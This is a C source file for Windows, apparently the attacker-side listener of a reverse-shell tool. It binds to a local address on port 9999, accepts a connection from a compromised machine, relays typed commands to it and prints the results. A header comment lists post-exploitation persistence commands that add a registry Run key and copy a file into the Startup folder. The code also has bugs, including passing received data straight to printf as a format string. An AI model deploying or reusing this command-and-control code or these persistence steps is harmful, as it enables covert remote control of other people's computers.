/* POST-EXPLOTATION TECHNIQUES:
    REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v <name> /t REG_SZ /d <filepath>
    copy <filepath> "C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\<filename>"
*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
#define BUFFER_SIZE_MEDIUM 4096
#define BUFFER_SIZE_BIG 8192
//====================================================================== FUNCTIONS ======================================================================
int handle_scanf(int, int);
void ReceiveResponse(int, char*);
int ListenMode();
//=======================================================================================================================================================

int main() {
    start:
    int socket_connection = ListenMode();
    if (socket_connection == INVALID_SOCKET)
    {
        goto start;
    }
    
    while (true)
    {
        char container[BUFFER_SIZE_BIG];
        char container2[BUFFER_SIZE_MEDIUM];
        char command[DEFAULT_BUFLEN] = "";
        memset(container, 0, sizeof(BUFFER_SIZE_BIG));
        memset(container2, 0, sizeof(BUFFER_SIZE_MEDIUM));
        fputs("\n >>> ", stdout);
        fgets(command, DEFAULT_BUFLEN, stdin);

        if (strcmp(command, "cd .") == 0)
        {
            continue;
        }
        else 
        {
            send(socket_connection, command, sizeof(command), 0);
            ReceiveResponse(socket_connection, container);
        }
    }
}

int ListenMode()
{
    int socket_connection = INVALID_SOCKET;
    while (socket_connection == INVALID_SOCKET)
    {
        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        if (!(WSAStartup(MAKEWORD(2, 2), &version) == 0))
        {
            printf("[!] ERROR at starting WSA: %i\n", WSAGetLastError());
        }
        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("192.168.1.15");
        addr.sin_port = htons(9999);

        bind(mySocket, (struct sockaddr*)&addr, sizeof(addr));
        printf("[+] Waiting for connections... \n");
        listen(mySocket, 128);
        struct sockaddr_in cli_addr = { 0 };
        socklen_t cli_addrlen = sizeof(cli_addr);
        int socket_connection = accept(mySocket, (struct sockaddr*)&cli_addr, &cli_addrlen);
        if (socket_connection == INVALID_SOCKET)
        {
            printf("[!] ERROR at accept socket connection: %i\n", WSAGetLastError());
        }
        char connection_details[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &cli_addr.sin_addr, connection_details, sizeof(connection_details));
        printf("[+] Connected back | IP: %s | Port: ", connection_details);
        printf("%i\n", cli_addr.sin_port);
        return socket_connection;
    }
}

int handle_scanf(int returned, int expected) {
    if (returned == expected)
        return 0;
    if (returned == EOF) {
        puts("\n[*] Error : Input Terminated Immaturely.");
        return -1;
    }
    else {
        puts("\n[*] Error : Insufficient Input.");
        return -2;
    }
}

void ReceiveResponse(int socket_connection, char * container_local)
{
    char response_back[BUFFER_SIZE_BIG];
    memset(response_back, 0, sizeof(response_back));
    if (recv(socket_connection, response_back, BUFFER_SIZE_BIG, 0) < 0)
    {
        wchar_t* s = NULL;
        FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL, WSAGetLastError(),
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPWSTR)&s, 0, NULL);
        fprintf(stderr, "%S\n", s);
        LocalFree(s);
    }
    else if(response_back == NULL)
    {
        wchar_t* s = NULL;
        FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL, WSAGetLastError(),
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPWSTR)&s, 0, NULL);
        fprintf(stderr, "%S\n", s);
        LocalFree(s);
    }
    else if(response_back[8100] != '\0')
    {
        while (response_back[8100] != '\0')
        {
            strcat(container_local, response_back);
            printf(container_local);
            memset(container_local, 0, sizeof(container_local));
            memset(response_back, 0, sizeof(response_back));
            recv(socket_connection, response_back, BUFFER_SIZE_BIG, 0);
        }
    }
    else
    {
        wchar_t* s = NULL;
        FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL, WSAGetLastError(),
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPWSTR)&s, 0, NULL);
        fprintf(stderr, "%S\n", s);
        LocalFree(s);
        strcat(container_local, response_back);
        printf(container_local);
    }
}
